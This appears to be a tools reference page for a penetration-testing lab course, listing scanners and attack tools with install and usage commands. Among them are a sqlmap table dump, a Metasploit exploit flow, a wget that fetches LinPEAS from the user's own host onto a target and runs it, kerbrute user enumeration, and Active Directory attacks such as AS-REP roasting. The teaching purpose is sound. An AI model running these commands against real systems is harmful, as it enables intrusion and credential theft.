Nmap

PORT SCANNER

Industry-standard network exploration, host discovery, port scanner, and OS detection engine. The first tool you reach for on any box.

Install Package sudo apt update && sudo apt install -y nmap
Verify Version nmap --version
Default first scan nmap -sC -sV -oN scan.txt <IP>
Active in: Lab 01 · Lab 07 Standard CLI

Install Package sudo apt install -y wireshark tshark
Verify Version tshark -v
Active in: Lab 01 GUI & CLI Sniffer

sqlmap

SQLi AUTOMATION

Automated SQL injection detection and database dumping. In Lab 03 you learn it last, after doing UNION by hand, so it stays a tool you understand instead of a magic button.

Install (Kali has it) sudo apt install -y sqlmap
Verify sqlmap --version
Detect + list databases sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs
Dump a table sqlmap -u "<url>" --batch -T Users --dump
Active in: Lab 03 CLI · exploitation
🎨

Request Highlighter

IN-BROWSER · NO INSTALL

Paste a raw HTTP request or response and it colorizes it: method, path, headers, status codes. A font slider and line-wrap toggle make it readable on a projector when Burp's panes are too small. Single mode or request+response side by side. Runs entirely in your browser, nothing leaves the page.

Open it (new tab) request-highlighter.html
Use it Copy a request from DevTools or Burp → paste → set the font size
Active in: Lab 03 In-browser · display

Metasploit Framework

EXPLOIT ENGINE

Packages known exploits into a point-and-shoot console: pick a module, set the target and your IP, type exploit. Learn the five-step flow once and it runs every module.

Install Package sudo apt install -y metasploit-framework
Verify Console msfconsole -v
The flow search <cve> → use <module> → set RHOSTS/LHOST → exploit
Active in: Lab 08 Framework CLI

searchsploit (Exploit-DB)

EXPLOIT LOOKUP

A local, offline copy of Exploit-DB you grep from the terminal. Turn a service version from your scan into a known exploit, then read the raw script before you run it.

Install (Kali has it) sudo apt install -y exploitdb
Search by service + version searchsploit vsftpd 2.3.4
Read the raw exploit searchsploit -x <path>
Active in: Lab 08 CLI · exploitation

Gobuster

CONTENT DISCOVERY

Brute-forces hidden directories and files on a web server, the pages that aren't linked from the homepage: admin panels, backups, /dev, upload folders.

Install (Kali has it) sudo apt install -y gobuster
Verify gobuster version
Find hidden paths gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
Active in: Lab 07 CLI · enumeration
🗄️

enum4linux & smbclient

SMB ENUMERATION

Pull usernames, shares, and OS info off a Samba/SMB service (ports 139/445). smbclient lists and browses shares; enum4linux wraps the whole enumeration in one command.

Install (Kali has them) sudo apt install -y enum4linux smbclient
List shares, no login smbclient -L //<IP>/ -N
Full enumeration enum4linux -a <IP>
Active in: Lab 07 CLI · enumeration
🧨

LinPEAS / winPEAS

PRIVESC ENUMERATION

Post-exploitation enumeration scripts that run every privilege-escalation check at once and highlight findings in red. LinPEAS for Linux, winPEAS for Windows. Learn the manual checks (sudo -l, SUID, cron) first so you understand what it flags.

Get it (from your box to the target) wget <your-host>/linpeas.sh -O /tmp/linpeas.sh
Run it chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
Source github.com/peass-ng/PEASS-ng
Active in: Lab 09 Script · post-exploitation
📖

GTFOBins

REFERENCE · NO INSTALL

A catalog of how ordinary Unix binaries can be abused to break out of a restricted shell or escalate privileges. When sudo -l or a SUID hunt turns up a binary, look it up here for the exact technique.

Open it (bookmark it) gtfobins.github.io
Use it Search the binary → read the "sudo" or "SUID" section → copy the one-liner
Active in: Lab 09 In-browser · reference
🩸

BloodHound

AD ATTACK PATHS

Collects every object and permission in a Windows domain and graphs it, then finds the shortest path from your account to Domain Admin. The single most valuable Active Directory tool. bloodhound-python is the collector you run from Linux.

Install collector pip install bloodhound
Collect with a domain account bloodhound-python -d <domain> -u <user> -p <pass> -c all -ns <DC_IP>
Then Load the JSON → run "Shortest Path to Domain Admins"
Active in: Lab 10 GUI + CLI · AD
🎟️

kerbrute

AD USER ENUM

Enumerates valid domain usernames and sprays passwords through Kerberos. Because it asks the DC pre-authentication, it finds valid accounts with no failed logins and no lockouts.

Get it Download the release binary from the kerbrute repo
Enumerate users kerbrute userenum -d <domain> --dc <DC_IP> users.txt
Active in: Lab 10 CLI · AD
🧰

Impacket

AD TOOLKIT

A collection of Python tools for Windows/AD protocols. You'll use GetNPUsers (AS-REP roast), GetUserSPNs (Kerberoast), secretsdump (DCSync), and psexec across the AD labs.

Install (Kali has it) sudo apt install -y impacket-scripts
Example: AS-REP roast impacket-GetNPUsers <domain>/<user> -no-pass -dc-ip <IP>
Active in: Lab 11 · Lab 12 CLI · AD
